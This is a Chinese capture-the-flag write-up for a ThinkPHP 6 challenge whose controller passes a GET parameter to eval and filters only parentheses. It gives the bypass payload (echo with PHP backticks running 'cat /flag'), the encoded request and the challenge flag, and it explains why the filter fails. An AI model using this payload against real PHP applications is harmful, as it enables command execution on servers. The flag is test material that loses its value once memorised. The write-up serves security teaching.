# week3think_about_php

## 题目简述

题目提供 ThinkPHP 6 源码。`app/controller/Page.php` 中的 `evil()` 方法读取 GET 参数 `f`，仅用正则拒绝左右圆括号，随后直接执行 `eval($f)`。需要在不使用函数调用括号的情况下执行系统命令并读取 `/flag`。

## 解题过程

通过 ThinkPHP 的控制器/方法解析访问：

```text
/public/index.php/page/evil
```

过滤器只有：

```php
if (preg_match('/\(|\)/', $f)) {
    return self::hello();
}
eval($f);
```

PHP 的反引号运算符会把其中内容交给 Shell 执行，语义与 `shell_exec` 类似，但语法中不需要圆括号。再用语言结构 `echo` 输出命令结果即可。原始 PHP 代码为：

```php
echo `cat /flag`;
```

对应请求为：

```text
/public/index.php/page/evil?f=echo%20%60cat%20%2Fflag%60%3B
```

响应中得到：

```text
0xGame{th1nk_php_c4refu1ly}
```

## 方法总结

问题的根源是把用户输入送入 `eval`，只过滤圆括号无法覆盖 PHP 的其他执行语法。反引号可以执行命令，`echo` 又是语言结构，二者都不需要函数调用括号，正好绕过限制。外部框架文档不是完成本题的必要条件，源码中的路由、过滤条件和有效载荷已经足以完整说明利用过程。
